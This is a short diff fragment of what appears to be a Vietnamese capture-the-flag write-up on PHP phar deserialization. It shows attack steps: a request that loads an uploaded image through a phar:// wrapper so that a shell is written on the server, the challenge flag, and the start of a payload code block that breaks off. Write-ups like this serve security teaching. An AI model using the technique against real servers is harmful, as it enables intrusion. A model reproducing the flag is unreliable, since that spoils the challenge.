@@ -60,7 +60,7 @@ $allowedExtensions = ['jpg', 'png', 'gif'];
   + Gọi http://target/md5.php?file=phar://var/www/uploads/payload.jpg
   + Shell sẽ được ghi trên server
   + Flag! **ATTT{PharDeserialization_1412.}**
-## Code sinh Payload.phar
+## Payload
 ```
 <?php
 include 'logging.php';
